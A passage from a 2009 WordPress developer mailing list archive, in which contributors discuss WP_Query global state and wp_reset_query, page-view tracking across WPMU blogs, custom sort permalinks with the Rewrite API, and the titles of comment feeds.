References: <D5C3FB82-0D76-4BD5-AC8C-D330AEDF557F@gmail.com>
Message-ID: <4ACDEF14.7080309@gaarai.com>

There's nothing wrong with the code. The problem is your logic.

In short, you are latching state tracking code in the wrong place. I did
the following, and both methods matched:

    // page.php
    ...
    $wp_query = new WP_Query('cat=1&showposts=' . get_option('posts_per_page') . '&paged=' . $paged);
    apply_filters( 'show_data', '' );
    ...

    // functions.php
    ...
    add_filter('show_data', 'default_join');
    ...

The problem is that the is_404(), etc functions are using the $wp_query
variable to do their thing. The first set of code runs these checks
before the constructor finishes. This means that your new $wp_query
variable has not been initiated yet, thus the old $wp_query variable is
being checked, not your new one. The second one works because you first
update the $wp_query variable with the new instance and then run the
code that launches the checks.

The way the code worked was the same in all of your code examples. The
only thing that differed was how you viewed the data.

My changes viewed the data after the constructor had finished and the
variable had been updated with the new instance. Thus, all query methods
worked as expected.

As Otto said, just use the query method. It's easier, quicker, and makes
the way the code operates easier to understand (case in point).

Chris Jean
http://gaarai.com/
http://wp-roadmap.com/
http://dnsyogi.com/



Luke Gallagher wrote:
> While working with Wordpress I found some odd behaviour, and before I
> continue to get this patched I am wondering if anyone can verify that
> this is actually bug or if it is the intended behaviour of Wordpress.
>
> Here is a previous bug that may be related:
> http://core.trac.wordpress.org/ticket/9854
>
> I have verified that the following is the case for the current
> checkout of the Wordpress core.
>
> If I create a custom wp_query object in the default theme's page.php
> file, right after get_header() like so:
> http://gist.github.com/204994
>
> and I have a posts_join filter in
> /wp-content/themes/default/functions.php that prints out to the
> error_log what type of request this is. ( I also tried this out with
> posts_where and pre_get_posts with the same results )
>
> Loading the about page in the web browser I get the following in error
> log:
>
> is_page
> is_singular
> -------
> is_page
> is_singular
> -------
>
>
> But if I do it this way I get:
> http://gist.github.com/204996
>
> is_page
> is_singular
> -------
> is_archive
> is_category
> -------
>
>
> I would think that the latter result is the correct behaviour, should
> be so in the first instance.
>
> Using query_posts instead in the same situation works:
> http://gist.github.com/205004
>
> is_page
> is_singular
> -------
> is_archive
> is_category
> -------
>
> So should I just be using query_posts in this context?
> Is there something that I'm missing here?
>
> thanks,
>
> Luke
>
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From notfornoone at gmail.com  Thu Oct  8 22:14:53 2009
From: notfornoone at gmail.com (Luke Gallagher)
Date: Fri, 9 Oct 2009 09:14:53 +1100
Subject: [wp-hackers] wp_query gets poisoned by new WP_Query objects
In-Reply-To: <4ACDEF14.7080309@gaarai.com>
References: <D5C3FB82-0D76-4BD5-AC8C-D330AEDF557F@gmail.com>
	<4ACDEF14.7080309@gaarai.com>
Message-ID: <84de0ce00910081514yb0a2806h4a9e66e4e6b56658@mail.gmail.com>

Thanks for the feedback guys.

The reason I was cloning $wp_query was for connivence so I didn't have
to do $new_query->have_posts() etc. query_posts will give me the
connivence benefit anyway.

After reading the advice from both of you it seems that I should just
be using query_posts.

Thanks for your help.



2009/10/9 Chris Jean <gaarai at gaarai.com>:
> There's nothing wrong with the code. The problem is your logic.
>
> In short, you are latching state tracking code in the wrong place. I did
> the following, and both methods matched:
>
> ? ?// page.php
> ? ?...
> ? ?$wp_query = new WP_Query('cat=1&showposts=' . get_option('posts_per_page') . '&paged=' . $paged);
> ? ?apply_filters( 'show_data', '' );
> ? ?...
>
> ? ?// functions.php
> ? ?...
> ? ?add_filter('show_data', 'default_join');
> ? ?...
>
> The problem is that the is_404(), etc functions are using the $wp_query
> variable to do their thing. The first set of code runs these checks
> before the constructor finishes. This means that your new $wp_query
> variable has not been initiated yet, thus the old $wp_query variable is
> being checked, not your new one. The second one works because you first
> update the $wp_query variable with the new instance and then run the
> code that launches the checks.
>
> The way the code worked was the same in all of your code examples. The
> only thing that differed was how you viewed the data.
>
> My changes viewed the data after the constructor had finished and the
> variable had been updated with the new instance. Thus, all query methods
> worked as expected.
>
> As Otto said, just use the query method. It's easier, quicker, and makes
> the way the code operates easier to understand (case in point).
>
> Chris Jean
> http://gaarai.com/
> http://wp-roadmap.com/
> http://dnsyogi.com/
>
>
>
> Luke Gallagher wrote:
>> While working with Wordpress I found some odd behaviour, and before I
>> continue to get this patched I am wondering if anyone can verify that
>> this is actually bug or if it is the intended behaviour of Wordpress.
>>
>> Here is a previous bug that may be related:
>> http://core.trac.wordpress.org/ticket/9854
>>
>> I have verified that the following is the case for the current
>> checkout of the Wordpress core.
>>
>> If I create a custom wp_query object in the default theme's page.php
>> file, right after get_header() like so:
>> http://gist.github.com/204994
>>
>> and I have a posts_join filter in
>> /wp-content/themes/default/functions.php that prints out to the
>> error_log what type of request this is. ( I also tried this out with
>> posts_where and pre_get_posts with the same results )
>>
>> Loading the about page in the web browser I get the following in error
>> log:
>>
>> is_page
>> is_singular
>> -------
>> is_page
>> is_singular
>> -------
>>
>>
>> But if I do it this way I get:
>> http://gist.github.com/204996
>>
>> is_page
>> is_singular
>> -------
>> is_archive
>> is_category
>> -------
>>
>>
>> I would think that the latter result is the correct behaviour, should
>> be so in the first instance.
>>
>> Using query_posts instead in the same situation works:
>> http://gist.github.com/205004
>>
>> is_page
>> is_singular
>> -------
>> is_archive
>> is_category
>> -------
>>
>> So should I just be using query_posts in this context?
>> Is there something that I'm missing here?
>>
>> thanks,
>>
>> Luke
>>
>>
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From gaarai at gaarai.com  Thu Oct  8 22:34:13 2009
From: gaarai at gaarai.com (Chris Jean)
Date: Thu, 08 Oct 2009 17:34:13 -0500
Subject: [wp-hackers] wp_query gets poisoned by new WP_Query objects
In-Reply-To: <84de0ce00910081514yb0a2806h4a9e66e4e6b56658@mail.gmail.com>
References: <D5C3FB82-0D76-4BD5-AC8C-D330AEDF557F@gmail.com>	<4ACDEF14.7080309@gaarai.com>
	<84de0ce00910081514yb0a2806h4a9e66e4e6b56658@mail.gmail.com>
Message-ID: <4ACE68E5.5090301@gaarai.com>

Yup. query_posts() is much simpler and bypasses the problems you didn't
want to deal with. You can always run wp_reset_query() after you are
done with your custom loop to set $wp_query and all the associated data
back.

Chris Jean
http://gaarai.com/
http://wp-roadmap.com/
http://dnsyogi.com/



Luke Gallagher wrote:
> Thanks for the feedback guys.
>
> The reason I was cloning $wp_query was for connivence so I didn't have
> to do $new_query->have_posts() etc. query_posts will give me the
> connivence benefit anyway.
>
> After reading the advice from both of you it seems that I should just
> be using query_posts.
>
> Thanks for your help.
>
>
>
> 2009/10/9 Chris Jean <gaarai at gaarai.com>:
>   
>> There's nothing wrong with the code. The problem is your logic.
>>
>> In short, you are latching state tracking code in the wrong place. I did
>> the following, and both methods matched:
>>
>>    // page.php
>>    ...
>>    $wp_query = new WP_Query('cat=1&showposts=' . get_option('posts_per_page') . '&paged=' . $paged);
>>    apply_filters( 'show_data', '' );
>>    ...
>>
>>    // functions.php
>>    ...
>>    add_filter('show_data', 'default_join');
>>    ...
>>
>> The problem is that the is_404(), etc functions are using the $wp_query
>> variable to do their thing. The first set of code runs these checks
>> before the constructor finishes. This means that your new $wp_query
>> variable has not been initiated yet, thus the old $wp_query variable is
>> being checked, not your new one. The second one works because you first
>> update the $wp_query variable with the new instance and then run the
>> code that launches the checks.
>>
>> The way the code worked was the same in all of your code examples. The
>> only thing that differed was how you viewed the data.
>>
>> My changes viewed the data after the constructor had finished and the
>> variable had been updated with the new instance. Thus, all query methods
>> worked as expected.
>>
>> As Otto said, just use the query method. It's easier, quicker, and makes
>> the way the code operates easier to understand (case in point).
>>
>> Chris Jean
>> http://gaarai.com/
>> http://wp-roadmap.com/
>> http://dnsyogi.com/
>>
>>
>>
>> Luke Gallagher wrote:
>>     
>>> While working with Wordpress I found some odd behaviour, and before I
>>> continue to get this patched I am wondering if anyone can verify that
>>> this is actually bug or if it is the intended behaviour of Wordpress.
>>>
>>> Here is a previous bug that may be related:
>>> http://core.trac.wordpress.org/ticket/9854
>>>
>>> I have verified that the following is the case for the current
>>> checkout of the Wordpress core.
>>>
>>> If I create a custom wp_query object in the default theme's page.php
>>> file, right after get_header() like so:
>>> http://gist.github.com/204994
>>>
>>> and I have a posts_join filter in
>>> /wp-content/themes/default/functions.php that prints out to the
>>> error_log what type of request this is. ( I also tried this out with
>>> posts_where and pre_get_posts with the same results )
>>>
>>> Loading the about page in the web browser I get the following in error
>>> log:
>>>
>>> is_page
>>> is_singular
>>> -------
>>> is_page
>>> is_singular
>>> -------
>>>
>>>
>>> But if I do it this way I get:
>>> http://gist.github.com/204996
>>>
>>> is_page
>>> is_singular
>>> -------
>>> is_archive
>>> is_category
>>> -------
>>>
>>>
>>> I would think that the latter result is the correct behaviour, should
>>> be so in the first instance.
>>>
>>> Using query_posts instead in the same situation works:
>>> http://gist.github.com/205004
>>>
>>> is_page
>>> is_singular
>>> -------
>>> is_archive
>>> is_category
>>> -------
>>>
>>> So should I just be using query_posts in this context?
>>> Is there something that I'm missing here?
>>>
>>> thanks,
>>>
>>> Luke
>>>
>>>
>>>
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>       
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>     
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>   

From wordpress at dd32.id.au  Fri Oct  9 06:29:07 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Fri, 09 Oct 2009 17:29:07 +1100
Subject: [wp-hackers] wp_query gets poisoned by new WP_Query objects
In-Reply-To: <4ACE68E5.5090301@gaarai.com>
References: <D5C3FB82-0D76-4BD5-AC8C-D330AEDF557F@gmail.com>
	<4ACDEF14.7080309@gaarai.com>
	<84de0ce00910081514yb0a2806h4a9e66e4e6b56658@mail.gmail.com>
	<4ACE68E5.5090301@gaarai.com>
Message-ID: <op.u1isagwxspxmuu@dd32.no-ip.com>

Infact, I'd suggest you DO run wp_reset_query(), As many themes include  
the sidebar after the main loop. The end result is that widgets in the  
sidebar will get your custom loop instead of what you'd expect them to get  
(ie. this posts tags, or the current page in a page widget, etc).

On Fri, 09 Oct 2009 09:34:13 +1100, Chris Jean <gaarai at gaarai.com> wrote:

> Yup. query_posts() is much simpler and bypasses the problems you didn't
> want to deal with. You can always run wp_reset_query() after you are
> done with your custom loop to set $wp_query and all the associated data
> back.
>
> Chris Jean
> http://gaarai.com/
> http://wp-roadmap.com/
> http://dnsyogi.com/
>
>
>
> Luke Gallagher wrote:
>> Thanks for the feedback guys.
>>
>> The reason I was cloning $wp_query was for connivence so I didn't have
>> to do $new_query->have_posts() etc. query_posts will give me the
>> connivence benefit anyway.
>>
>> After reading the advice from both of you it seems that I should just
>> be using query_posts.
>>
>> Thanks for your help.


-- 
Dion Hulse
e: contact at dd32.id.au
w: http://dd32.id.au
WordPressQI: http://wordpressqi.com/

From viniciusandre at gmail.com  Fri Oct  9 11:25:39 2009
From: viniciusandre at gmail.com (Vinicius Massuchetto)
Date: Fri, 9 Oct 2009 08:25:39 -0300
Subject: [wp-hackers] Get most seen blogs on WPMU
Message-ID: <4ede8f490910090425y22153966gf60df65dbca9308d@mail.gmail.com>

Hi!

I've been looking for a WPMU mailing list. Let me know if this list is
not for this purpose.

I want to show the most seen blogs on WPMU home, and as I didn't find
any function that go through blogs by page view I was thinking about
putting a call to write on a table `wp_accesses` (or something) on
header.php of each theme available, so I can filter the most accessed
blogs by counting entries on this table.

Thought, if there's a more intelligent way of doing it I would be glad
in taking some advices about.

Thanks!
--
Vin?cius Massuchetto
http://vinicius.soylocoporti.org.br

From brad at webdevstudios.com  Fri Oct  9 12:52:19 2009
From: brad at webdevstudios.com (Brad Williams)
Date: Fri, 9 Oct 2009 08:52:19 -0400
Subject: [wp-hackers] Get most seen blogs on WPMU
In-Reply-To: <4ede8f490910090425y22153966gf60df65dbca9308d@mail.gmail.com>
References: <4ede8f490910090425y22153966gf60df65dbca9308d@mail.gmail.com>
Message-ID: <007001ca48df$56a94080$03fbc180$@com>

Pretty sure there is no built-in page view tracking in WordPress or WPMU.  

-Brad
@williamsba
http://webdevstudios.com


-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Vinicius Massuchetto
Sent: Friday, October 09, 2009 7:26 AM
To: Wordpress Hackers
Subject: [wp-hackers] Get most seen blogs on WPMU

Hi!

I've been looking for a WPMU mailing list. Let me know if this list is
not for this purpose.

I want to show the most seen blogs on WPMU home, and as I didn't find
any function that go through blogs by page view I was thinking about
putting a call to write on a table `wp_accesses` (or something) on
header.php of each theme available, so I can filter the most accessed
blogs by counting entries on this table.

Thought, if there's a more intelligent way of doing it I would be glad
in taking some advices about.

Thanks!
--
Vin?cius Massuchetto
http://vinicius.soylocoporti.org.br
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers


From spellham at flowershopnetwork.com  Fri Oct  9 15:15:05 2009
From: spellham at flowershopnetwork.com (Steve Pellham)
Date: Fri, 9 Oct 2009 10:15:05 -0500
Subject: [wp-hackers] Get most seen blogs on WPMU
In-Reply-To: <007001ca48df$56a94080$03fbc180$@com>
References: <4ede8f490910090425y22153966gf60df65dbca9308d@mail.gmail.com>
	<007001ca48df$56a94080$03fbc180$@com>
Message-ID: <b6a9375d0910090815i9988751qcbd7a3bd174bef61@mail.gmail.com>

Would pixelstats work. Never used in in mu, but might be worth checking.

On 10/9/09, Brad Williams <brad at webdevstudios.com> wrote:
> Pretty sure there is no built-in page view tracking in WordPress or WPMU.
>
> -Brad
> @williamsba
> http://webdevstudios.com
>
>
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Vinicius
> Massuchetto
> Sent: Friday, October 09, 2009 7:26 AM
> To: Wordpress Hackers
> Subject: [wp-hackers] Get most seen blogs on WPMU
>
> Hi!
>
> I've been looking for a WPMU mailing list. Let me know if this list is
> not for this purpose.
>
> I want to show the most seen blogs on WPMU home, and as I didn't find
> any function that go through blogs by page view I was thinking about
> putting a call to write on a table `wp_accesses` (or something) on
> header.php of each theme available, so I can filter the most accessed
> blogs by counting entries on this table.
>
> Thought, if there's a more intelligent way of doing it I would be glad
> in taking some advices about.
>
> Thanks!
> --
> Vin?cius Massuchetto
> http://vinicius.soylocoporti.org.br
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

-- 
Sent from my mobile device

From emartin24 at gmail.com  Fri Oct  9 15:48:41 2009
From: emartin24 at gmail.com (Eric Martin)
Date: Fri, 9 Oct 2009 08:48:41 -0700 (PDT)
Subject: [wp-hackers] Custom permalinks with the Rewrite API
Message-ID: <738f5882-3202-48d3-9612-d38cf5fc1a87@x25g2000prf.googlegroups.com>

I want to be able to allow users to custom sort a group of posts by
adding a custom rewrite rule. I'm thinking of the following structure:

/some-slug/sort/title:desc/
/some-slug/sort/date:desc/
/some-slug/sort/downloads:desc/

I have tried doing this a couple of ways, but can't seem to get it to
work:
- some-slug as a page
- some-slug as a category and using permalink structure of /%category%/
%postname%/

One catch is that the sorting should still work with pagination.
Depending on which they do first, the URI could look different:
/some-slug/sort/title:desc/page/2
/some-slug/page/2/sort/title:desc/

I tried using an endpoint first, but that doesn't seem to work with 2
endpoints together, which makes sense.

So, I'm curious if others have done this and if there are any
suggestions on the "best" approach. I'd love to see some examples and
appreciate any help you can provide.

On a side note, there doesn't seem to be a whole lot of good
documentation or examples surrounding the Rewrite API. What
information is out there (on blogs and such) is often outdated or
misleading. Based on what I'm able to learn through this processes, I
hope to be able to create some helpful information and examples on how
the Rewrite API works.

--
Eric Martin
http://www.ericmmartin.com
http://twitter.com/ericmmartin

From jer at simianuprising.com  Fri Oct  9 15:54:05 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Fri, 9 Oct 2009 11:54:05 -0400
Subject: [wp-hackers] Get most seen blogs on WPMU
In-Reply-To: <4ede8f490910090425y22153966gf60df65dbca9308d@mail.gmail.com>
References: <4ede8f490910090425y22153966gf60df65dbca9308d@mail.gmail.com>
Message-ID: <e1202cb10910090854y80850b0ifa11ba3a84da8fac@mail.gmail.com>

On Fri, Oct 9, 2009 at 7:25 AM, Vinicius Massuchetto
<viniciusandre at gmail.com> wrote:
> I want to show the most seen blogs on WPMU home, and as I didn't find
> any function that go through blogs by page view I was thinking about
> putting a call to write on a table `wp_accesses` (or something) on
> header.php of each theme available, so I can filter the most accessed
> blogs by counting entries on this table.

Any solution you find will involve a lot of writing to the database to
track hits or else interfacing with an external service in complicated
ways to compare the stats of the different blogs (i.e. you might be
able to run a cron that checks the Google Analytics api for each of
your blogs and sorts them).

A fun idea might be to use wp-supercache to get stats on which blogs
have the most cached pages. Not sure how feasible that would be but in
theory its sexy :P

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From if.website at gmail.com  Fri Oct  9 16:15:48 2009
From: if.website at gmail.com (Austin Matzko)
Date: Fri, 9 Oct 2009 11:15:48 -0500
Subject: [wp-hackers] Custom permalinks with the Rewrite API
In-Reply-To: <738f5882-3202-48d3-9612-d38cf5fc1a87@x25g2000prf.googlegroups.com>
References: <738f5882-3202-48d3-9612-d38cf5fc1a87@x25g2000prf.googlegroups.com>
Message-ID: <674b4a3b0910090915v5b3c030cid83105bdbf0cc557@mail.gmail.com>

On Fri, Oct 9, 2009 at 10:48 AM, Eric Martin <emartin24 at gmail.com> wrote:
> I want to be able to allow users to custom sort a group of posts by
> adding a custom rewrite rule. I'm thinking of the following structure:
>
> /some-slug/sort/title:desc/
> /some-slug/sort/date:desc/
> /some-slug/sort/downloads:desc/
>
> I have tried doing this a couple of ways, but can't seem to get it to
> work:
> - some-slug as a page
> - some-slug as a category and using permalink structure of /%category%/
> %postname%/
>
> One catch is that the sorting should still work with pagination.
> Depending on which they do first, the URI could look different:
> /some-slug/sort/title:desc/page/2
> /some-slug/page/2/sort/title:desc/
>
> I tried using an endpoint first, but that doesn't seem to work with 2
> endpoints together, which makes sense.
>
> So, I'm curious if others have done this and if there are any
> suggestions on the "best" approach. I'd love to see some examples and
> appreciate any help you can provide.

If "some-slug" is for pages, why don't you attach a callback to the
"page_rewrite_rules" filter ("post_rewrite_rules" for posts)?  Then
copy the array of rules passed to the callback, and loop through that
copy, modifying each key and value to work with your rewrite scheme.
Then prepend the modified array to the current ones and return.

Or create the modified version by temporarily modifying
$wp_rewrite->page_structure, then calling
$wp_rewrite->page_rewrite_rules() to generate the modified version.
However, I don't think that would help with something like

> /some-slug/page/2/sort/title:desc/

From viniciusandre at gmail.com  Fri Oct  9 17:19:33 2009
From: viniciusandre at gmail.com (Vinicius Massuchetto)
Date: Fri, 9 Oct 2009 14:19:33 -0300
Subject: [wp-hackers] Get most seen blogs on WPMU
In-Reply-To: <e1202cb10910090854y80850b0ifa11ba3a84da8fac@mail.gmail.com>
References: <4ede8f490910090425y22153966gf60df65dbca9308d@mail.gmail.com>
	<e1202cb10910090854y80850b0ifa11ba3a84da8fac@mail.gmail.com>
Message-ID: <4ede8f490910091019x1cae0c92qb358999980c950ea@mail.gmail.com>

On Fri, Oct 9, 2009 at 12:54 PM, Jeremy Clarke <jer at simianuprising.com> wrote:
> On Fri, Oct 9, 2009 at 7:25 AM, Vinicius Massuchetto
> <viniciusandre at gmail.com> wrote:
>> I want to show the most seen blogs on WPMU home, and as I didn't find
>> any function that go through blogs by page view I was thinking about
>> putting a call to write on a table `wp_accesses` (or something) on
>> header.php of each theme available, so I can filter the most accessed
>> blogs by counting entries on this table.
>
> Any solution you find will involve a lot of writing to the database to
> track hits or else interfacing with an external service in complicated
> ways to compare the stats of the different blogs (i.e. you might be
> able to run a cron that checks the Google Analytics api for each of
> your blogs and sorts them).

That sounds like a reasonable idea. Much better than just write on the
database, is to let Google do it for us.

I was trying to find some documentation on Codex about the Wordpress
pseudo-cron. I am unable to use cron on my server, actually.

> A fun idea might be to use wp-supercache to get stats on which blogs
> have the most cached pages. Not sure how feasible that would be but in
> theory its sexy :P

I don't think that would be a flexible and exact way of detecting page
views, perhaps it looks creative.

Thanks for helping.
--
Vin?cius Massuchetto
http://vinicius.soylocoporti.org.br

From info at toscho.de  Fri Oct  9 18:15:35 2009
From: info at toscho.de (Thomas Scholz)
Date: Fri, 09 Oct 2009 20:15:35 +0200
Subject: [wp-hackers] Prepend blog name in comment feed's title
Message-ID: <op.u1joz9bsr6yny2@toscho.de>

Hi,

I'm looking for a way to prepend my blog name to the title of comment  
feeds for single articles.

The template in WordPress (/wp-includes/feed-rss2-comments.php):

<title><?php
     if ( is_singular() )
         printf(ent2ncr(__('Comments on: %s')), get_the_title_rss());
     elseif ( is_search() )
         printf(ent2ncr(__('Comments for %s searching on %s')),  
get_bloginfo_rss( 'name' ), esc_attr($wp_query->query_vars['s']));
     else
     printf(ent2ncr(__('Comments for %s')), get_bloginfo_rss( 'name' ) .  
get_wp_title_rss());
?></title>

As you can see, I'm able to add a filter to 'the_title_rss' and add the  
blog name as a suffix.
<http://toscho.de/2009/wordpress-kommentarfeed-blogname/>

But how do I set the blog name in the first place? Any ideas?

Thomas

-- 
Redaktion, Druck- und Webdesign
http://toscho.de ? 0160/1764727
Twitter: @toscho

From otto at ottodestruct.com  Fri Oct  9 18:18:56 2009
From: otto at ottodestruct.com (Otto)
Date: Fri, 9 Oct 2009 13:18:56 -0500
Subject: [wp-hackers] Custom permalinks with the Rewrite API
In-Reply-To: <738f5882-3202-48d3-9612-d38cf5fc1a87@x25g2000prf.googlegroups.com>
References: <738f5882-3202-48d3-9612-d38cf5fc1a87@x25g2000prf.googlegroups.com>
Message-ID: <161617690910091118r4c964c20n6d80e69c53ac6155@mail.gmail.com>

Try this example on for size:

http://codex.wordpress.org/Custom_Queries#Permalinks_for_Custom_Archives


-Otto



On Fri, Oct 9, 2009 at 10:48 AM, Eric Martin <emartin24 at gmail.com> wrote:
> I want to be able to allow users to custom sort a group of posts by
> adding a custom rewrite rule. I'm thinking of the following structure:
>
> /some-slug/sort/title:desc/
> /some-slug/sort/date:desc/
> /some-slug/sort/downloads:desc/
>
> I have tried doing this a couple of ways, but can't seem to get it to
> work:
> - some-slug as a page
> - some-slug as a category and using permalink structure of /%category%/
> %postname%/
>
> One catch is that the sorting should still work with pagination.
> Depending on which they do first, the URI could look different:
> /some-slug/sort/title:desc/page/2
> /some-slug/page/2/sort/title:desc/
>
> I tried using an endpoint first, but that doesn't seem to work with 2
> endpoints together, which makes sense.
>
> So, I'm curious if others have done this and if there are any
> suggestions on the "best" approach. I'd love to see some examples and
> appreciate any help you can provide.
>
> On a side note, there doesn't seem to be a whole lot of good
> documentation or examples surrounding the Rewrite API. What
> information is out there (on blogs and such) is often outdated or
> misleading. Based on what I'm able to learn through this processes, I
> hope to be able to create some helpful information and examples on how
> the Rewrite API works.
>
> --
> Eric Martin
> http://www.ericmmartin.com
> http://twitter.com/ericmmartin
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From otto at ottodestruct.com  Fri Oct  9 18:22:19 2009
From: otto at ottodestruct.com (Otto)
Date: Fri, 9 Oct 2009 13:22:19 -0500
Subject: [wp-hackers] Prepend blog name in comment feed's title
In-Reply-To: <op.u1joz9bsr6yny2@toscho.de>
References: <op.u1joz9bsr6yny2@toscho.de>
Message-ID: <161617690910091122s2424a7dey4354108e41c9372e@mail.gmail.com>

Well, I'd try this in your code, for starters:

return get_bloginfo('name') . ' - ' . $str;

-Otto
Sent from Memphis, TN, United States


On Fri, Oct 9, 2009 at 1:15 PM, Thomas Scholz <info at toscho.de> wrote:
> Hi,
>
> I'm looking for a way to prepend my blog name to the title of comment feeds
> for single articles.
>
> The template in WordPress (/wp-includes/feed-rss2-comments.php):
>
> <title><?php
> ? ?if ( is_singular() )
> ? ? ? ?printf(ent2ncr(__('Comments on: %s')), get_the_title_rss());
> ? ?elseif ( is_search() )
> ? ? ? ?printf(ent2ncr(__('Comments for %s searching on %s')),
> get_bloginfo_rss( 'name' ), esc_attr($wp_query->query_vars['s']));
> ? ?else
> ? ?printf(ent2ncr(__('Comments for %s')), get_bloginfo_rss( 'name' ) .
> get_wp_title_rss());
> ?></title>
>
> As you can see, I'm able to add a filter to 'the_title_rss' and add the blog
> name as a suffix.
> <http://toscho.de/2009/wordpress-kommentarfeed-blogname/>
>
> But how do I set the blog name in the first place? Any ideas?
>
> Thomas
>
> --
> Redaktion, Druck- und Webdesign
> http://toscho.de ? 0160/1764727
> Twitter: @toscho
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From info at toscho.de  Fri Oct  9 18:38:23 2009
From: info at toscho.de (Thomas Scholz)
Date: Fri, 09 Oct 2009 20:38:23 +0200
Subject: [wp-hackers] Prepend blog name in comment feed's title
In-Reply-To: <161617690910091122s2424a7dey4354108e41c9372e@mail.gmail.com>
References: <op.u1joz9bsr6yny2@toscho.de>
	<161617690910091122s2424a7dey4354108e41c9372e@mail.gmail.com>
Message-ID: <op.u1jp19cmr6yny2@toscho.de>

Otto:

> Well, I'd try this in your code, for starters:
>
> return get_bloginfo('name') . ' - ' . $str;

This results in:
<title>Comments on: toscho.design - WordPress: Kommentarfeed mit  
Blognamen</title>

But I don't want the blog name somewhere between other words, because this  
reduces the scannability ? exact the opposite of what I want to achive.

thomas

-- 
Redaktion, Druck- und Webdesign
http://toscho.de ? 0160/1764727
Twitter: @toscho

From mikeschinkel at newclarity.net  Fri Oct  9 18:46:34 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 9 Oct 2009 14:46:34 -0400
Subject: [wp-hackers] Custom permalinks with the Rewrite API
In-Reply-To: <738f5882-3202-48d3-9612-d38cf5fc1a87@x25g2000prf.googlegroups.com>
References: <738f5882-3202-48d3-9612-d38cf5fc1a87@x25g2000prf.googlegroups.com>
Message-ID: <E4E0492A-0A6F-4E26-A9F1-7A7295D80CFF@newclarity.net>

Eric,

I have a custom plugin I've written for my own use that makes  
extensive use of URL rewrite.  It's not in a state to be released but  
is something I could send you if you like.  It powers http://pm-sherpa.com 
.  Email me and I'll forward to you.

BTW, I would not recommend using a colon in your URL like you have. A  
colon is a reserved character in the URI spec and as such will often  
get encoded by various softwares (i.e. title%3Adesc instead of  
title:desc):

2.2. Reserved Characters
(From http://www.ietf.org/rfc/rfc2396.txt)

    Many URI include components consisting of or delimited by, certain
    special characters.  These characters are called "reserved", since
    their usage within the URI component is limited to their reserved
    purpose.  If the data for a URI component would conflict with the
    reserved purpose, then the conflicting data must be escaped before
    forming the URI.

       reserved    = ";" | "/" | "?" | ":" | "@" | "&" | "=" | "+" |  
"$" | ","

    The "reserved" syntax class above refers to those characters that  
are
    allowed within a URI, but which may not be allowed within a
    particular component of the generic URI syntax; they are used as
    delimiters of the components described in Section 3.

Instead I'd suggest one of these based on the unreserved characters:

-- title-desc
-- title_desc
-- title.desc
-- title!desc
-- title~desc
-- title*desc
-- title(desc)

Not sure which I like the best.

2.3. Unreserved Characters

    Data characters that are allowed in a URI but do not have a reserved
    purpose are called unreserved.  These include upper and lower case
    letters, decimal digits, and a limited set of punctuation marks and
    symbols.

       unreserved  = alphanum | mark

       mark        = "-" | "_" | "." | "!" | "~" | "*" | "'" | "(" | ")"

    Unreserved characters can be escaped without changing the semantics
    of the URI, but this should not be done unless the URI is being used
    in a context that does not allow the unescaped character to appear.

HTH.

-Mike Schinkel
WordPress Custom Plugins
http://mikeschinkel.com/custom-wordpress-plugins/





On Oct 9, 2009, at 11:48 AM, Eric Martin wrote:

> I want to be able to allow users to custom sort a group of posts by
> adding a custom rewrite rule. I'm thinking of the following structure:
>
> /some-slug/sort/title:desc/
> /some-slug/sort/date:desc/
> /some-slug/sort/downloads:desc/
>
> I have tried doing this a couple of ways, but can't seem to get it to
> work:
> - some-slug as a page
> - some-slug as a category and using permalink structure of /%category 
> %/
> %postname%/
>
> One catch is that the sorting should still work with pagination.
> Depending on which they do first, the URI could look different:
> /some-slug/sort/title:desc/page/2
> /some-slug/page/2/sort/title:desc/
>
> I tried using an endpoint first, but that doesn't seem to work with 2
> endpoints together, which makes sense.
>
> So, I'm curious if others have done this and if there are any
> suggestions on the "best" approach. I'd love to see some examples and
> appreciate any help you can provide.
>
> On a side note, there doesn't seem to be a whole lot of good
> documentation or examples surrounding the Rewrite API. What
> information is out there (on blogs and such) is often outdated or
> misleading. Based on what I'm able to learn through this processes, I
> hope to be able to create some helpful information and examples on how
> the Rewrite API works.
>
> --
> Eric Martin
> http://www.ericmmartin.com
> http://twitter.com/ericmmartin
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From william.canino at googlemail.com  Fri Oct  9 19:39:38 2009
From: william.canino at googlemail.com (William Canino)
Date: Fri, 9 Oct 2009 15:39:38 -0400
Subject: [wp-hackers] How to throttle emails on hosts with email sending
	limits?
